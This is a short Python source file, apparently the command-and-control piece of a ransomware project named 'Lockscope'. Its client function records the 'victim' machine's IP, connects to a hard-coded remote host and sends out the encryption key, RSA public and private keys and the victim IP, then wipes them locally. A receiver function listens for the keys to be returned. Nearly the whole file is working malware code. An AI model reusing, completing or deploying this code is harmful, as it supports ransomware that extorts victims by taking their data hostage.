import socket
import time
import os


def client(key,public_key,private_key):
    
    IP = '192.168.1.137'
    PORT = 8080
    ADDR = (IP, PORT)
    victim_ip_path = r"C:\Lockscope\Fase 4\victim_ip.txt"
    
    machine_ip = socket.gethostbyname(socket.gethostname())

    with open(victim_ip_path, "wb") as f:
        f.write(machine_ip.encode())

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(ADDR)

    client.send("public_key.pem".encode())
    time.sleep(2)
    client.send(public_key)
    
    public_key = None

    client.send("private_key.pem".encode())
    time.sleep(2)
    client.send(private_key)

    private_key = None
    
    client.send("key.pkl".encode())
    time.sleep(2)
    client.send(key)

    key = None
    
    time.sleep(2)

    with open(victim_ip_path, "rb") as f:
        victim_ip = f.read()
        client.send("victim_ip.txt".encode())
        time.sleep(2)
        client.send(victim_ip)

    client.close()


def receiver():

    IP = socket.gethostbyname(socket.gethostname())
    PORT = 8081
    ADDR = (IP, PORT)
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.bind(ADDR)
    client.listen()

    conn, addr = client.accept()
    filename_aes_key = conn.recv(1024).decode()

    path_aes_key = os.path.join(r"C:\Lockscope\Fase 4", filename_aes_key)
    with open(path_aes_key, "wb") as f:
        data1 = conn.recv(1024)
        f.write(data1)

    filename_private_key = conn.recv(1024).decode()
    path_private_key = os.path.join(r"C:\Lockscope\Fase 4", filename_private_key)
    with open(path_private_key, "wb") as f:
        data2 = conn.recv(3096)
        f.write(data2)


    conn.close()